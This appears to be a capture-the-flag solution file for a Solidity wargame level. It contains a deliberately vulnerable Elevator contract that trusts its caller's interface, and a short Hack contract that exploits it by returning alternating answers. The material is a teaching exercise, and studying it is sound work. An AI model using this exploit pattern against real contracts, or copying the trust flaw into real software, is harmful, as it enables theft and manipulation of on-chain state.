// SPDX-License-Identifier: MIT
// the goal of this contract to reach the top floor 
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
// solution involves interface manipulation 

contract Hack is Building {
    bool public last = true;

    function isLastFloor(uint) override external returns (bool) {
        last = !last;
        return last;
    }

    function goToTop(address _elevatorAddr) public {
        Elevator(_elevatorAddr).goTo(1);
    }
}